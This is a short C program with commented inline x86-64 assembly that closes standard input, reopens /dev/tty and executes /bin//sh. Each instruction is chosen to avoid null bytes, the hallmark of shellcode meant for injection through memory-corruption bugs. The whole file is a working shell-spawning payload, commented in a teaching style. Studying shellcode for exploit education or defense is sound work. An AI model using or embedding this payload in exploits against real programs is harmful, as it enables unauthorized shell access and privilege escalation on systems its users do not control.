/**
 * clang -o shellcode_asm shellcode_asm.c
 * ./shellcode_asm
 */
int main(void) {
  __asm__(
  // ---------------------------------------------------------------------------
  // close
  // %rdi : unsigned int fd
  // ---------------------------------------------------------------------------
  "xor %rdi, %rdi\n\t"                   // Zero out rdi - without using 0
  "xor %rax, %rax\n\t"                   // Zero out rax - without using 0
  "mov $0x3, %al\n\t"                    // Write the syscall number (3) to al (eax, avoiding zero bytes)
  "syscall\n\t"                          // Do the syscall

  // ---------------------------------------------------------------------------
  // open
  // %rdi : int dfd
  // %rsi : const char * filename
  // %rdx : int flags
  // %r10 : int mode
  // ---------------------------------------------------------------------------

  // %rsi : const char * filename
  "xor %rax, %rax\n\t"                   // Zero out rax - without using 0
  "push %rax\n\t"                        // Push a string terminator
  "movabs $0x7974742f7665642f, %rbx\n\t" // Put the string in rbx: /dev/tty = 2f 64 65 76 2f 74 74 79
  "push %rbx\n\t"                        // Push rbx on the stack (now it's zero terminated)
  "mov %rsp, %rsi\n\t"                   // Put a pointer to the string in rsi

  // %rdx : int flags
  "xor %rdx, %rdx\n\t"                   // Zero out rdx - without using 0

  // %rdi : int dfd
  "xor %rdi, %rdi\n\t"                   // Zero out rdi - without using 0

  // %r10 : int mode
  "xor %r10, %r10\n\t"                   // Zero out r10 - without using 0

  // Syscall number
  "mov $0xFF, %al\n\t"                   // Write the syscall number (255) to al
  "inc %rax\n\t"
  "inc %rax\n\t"
  //"mov $0x101, %eax\n\t"                 // Write the syscall number (257) to eax
  "syscall\n\t"                          // Do the syscall

  // ---------------------------------------------------------------------------
  // execve
  // %rdi : const char * filename
  // %rsi : const char * const argv[]
  // %rdx : const char * const envp[]
  // ---------------------------------------------------------------------------
  "xor %rdx, %rdx\n\t"                   // Zero out rdx - without using 0
  "xor %rax, %rax\n\t"                   // Zero out rax - without using 0
  "push %rax\n\t"                        // Push a string terminator
  "movabs $0x68732f2f6e69622f, %rbx\n\t" // Put the string in rbx: /bin//sh = x2f x62 x69 x6e x2f x2f x73 x68
  "push %rbx\n\t"                        // Push rbx on the stack (now it's zero terminated)
  "mov %rsp, %rdi\n\t"                   // Put a pointer to the string in rdi
  "push %rdx\n\t"                        // Push a null to terminate the array
  "push %rdi\n\t"                        // Push the pointer to the string
  "mov %rsp, %rsi\n\t"                   // Put a pointer to argv in rsi
  "mov $0x3b, %al\n\t"                   // Write the syscall number (59) to al (eax, avoiding zero bytes)
  "syscall\n\t"                          // Do the syscall
  );
}